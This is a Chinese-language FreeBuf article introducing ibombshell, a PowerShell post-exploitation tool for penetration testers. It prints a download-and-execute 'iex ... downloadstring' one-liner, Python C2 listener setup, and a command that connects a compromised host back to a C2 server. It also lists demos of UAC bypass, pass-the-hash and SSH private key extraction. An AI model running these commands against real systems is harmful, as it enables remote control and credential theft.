**今天给大家介绍的是一款名叫ibombshell的动态远程Shell工具，该工具基于Powershell开发，可在后渗透利用阶段发挥其作用。**

![a.png](https://image.3001.net/images/20180716/15317554251079.png!small)

## ibombshell介绍

ibombshell本身是一个shell，但是它能够直接下载进目标设备的内存中，并给研究人员提供大量的渗透测试功能，这些功能是直接加载进内存的，并以Powershell函数的形式提供给测试人员，也就是说，这些功能“走到哪里”都能够直接执行。

除此之外，ibombshell还提供了一种名叫Silently的二级执行模式，所以渗透测试人员可以执行一个ibombshell实例（名叫warrior），被入侵的主机将会通过HTTP链接到一个C2控制面板，因此测试人员就可以通过控制warrior来实现对目标主机的渗透。

### 工具要求

为了发挥ibombshell的完整功能，首先要求的是Powershell
3.0及以上版本，如果你用的不是Windows，你可以阅读这篇【[文章](https://github.com/PowerShell/PowerShell)】来实现在任意系统上使用Powershell。

如果你想以Silently模式运行ibombshell，你还需要Python 3.6以及其他的一些Python库，安装命令如下：

    
    
    cd ibombshell\ c2/
    
    pip install -r requirements.txt

## 工具使用

ibombshell主要有两种执行模式：

第一种名叫“ibombshell everywhere”模式，你可以直接在Powershell上加载ibombshell：

    
    
    iex (new-objectnet.webclient).downloadstring(‘https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console’)

然后运行下载下来的ibombshell控制台：

    
    
    console

第二种名叫“ibombshell
silently”模式，当前版本允许我们运行ibombshell控制台并通过C2控制面板来实现远程访问。首先你需要在Powershell中启动控制台进程：

    
    
    iex (new-objectnet.webclient).downloadstring(‘https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console’)

设置好ibombshell的C2路径：

    
    
    python3 ibombshell.py

创建一个监听器，并与warrior相连：

    
    
    iBombShell>load modules/listener.py
    
    [+]Loading module...
    
    [+]Module loaded!
    
    iBombShell[modules/listener.py]>run

默认的监听端口为8080，然后在主机上以Silently模式启动控制台，并获取到远程控制权限：

    
    
    console-Silently -uriConsole http://[ip or domain]:[port]

## ibombshell C2机制

ibombshell控制面板的基本运行机制如下图所示：

![b.png](https://image.3001.net/images/20180716/15317554957948.png!small)

### Docker

我们还为用户提供了专门的Docker容器，你可以使用下列命令来使用它：

    
    
    sudo docker build -t "ibombshell" .
    
    sudo docker run -it ibombshell

## 工具使用演示

### iBombShell:PoC Warrior + Bypass UAC + Pass the hash

  

### iBombShell:macOS

  

### ibombshell:Extracting Private SSH Keys on Windows 10

  

### iBombShell:PoC savefunctions

  

## 许可证协议

本项目遵循GNU许可证协议。

***参考来源：[ibombshell](https://github.com/ElevenPaths/ibombshell)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

